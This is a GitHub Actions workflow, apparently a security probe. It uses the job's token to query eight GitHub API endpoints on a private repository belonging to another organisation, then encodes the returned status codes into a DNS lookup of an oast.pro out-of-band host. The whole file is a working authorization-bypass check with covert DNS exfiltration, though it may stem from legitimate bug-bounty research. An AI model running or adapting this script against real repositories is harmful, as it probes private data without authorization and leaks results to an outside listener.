name: finalsweep
on:
  workflow_dispatch:
permissions:
  contents: read
jobs:
  s:
    runs-on: ubuntu-latest
    steps:
      - name: most sensitive private-repo reads from a public token
        env:
          TOKEN: ${{ github.token }}
        run: |
          B=https://api.github.com
          A="Authorization: Bearer $TOKEN"
          H="Accept: application/vnd.github+json"
          P=tooforg/invisible-repo
          C1=$(curl -s -o /dev/null -w '%{http_code}' -H "$A" -H "$H" "$B/repos/$P/contents/")
          C2=$(curl -s -o /dev/null -w '%{http_code}' -H "$A" -H "$H" "$B/repos/$P/commits?per_page=1")
          C3=$(curl -s -o /dev/null -w '%{http_code}' -H "$A" -H "$H" "$B/repos/$P/releases")
          C4=$(curl -s -o /dev/null -w '%{http_code}' -H "$A" -H "$H" "$B/repos/$P/tags")
          C5=$(curl -s -o /dev/null -w '%{http_code}' -H "$A" -H "$H" "$B/repos/$P/branches")
          C6=$(curl -s -o /dev/null -w '%{http_code}' -H "$A" -H "$H" "$B/repos/$P/deployments")
          C7=$(curl -s -o /dev/null -w '%{http_code}' -H "$A" -H "$H" "$B/repos/$P/pages")
          C8=$(curl -s -o /dev/null -w '%{http_code}' -H "$A" -H "$H" "$B/repos/$P/git/refs")
          getent hosts "fs${C1}${C2}${C3}${C4}${C5}${C6}${C7}${C8}ro4yhyiy8bnjaqqlmuqbclo8ji2k2tsi9.oast.pro" > /dev/null 2>&1 || true
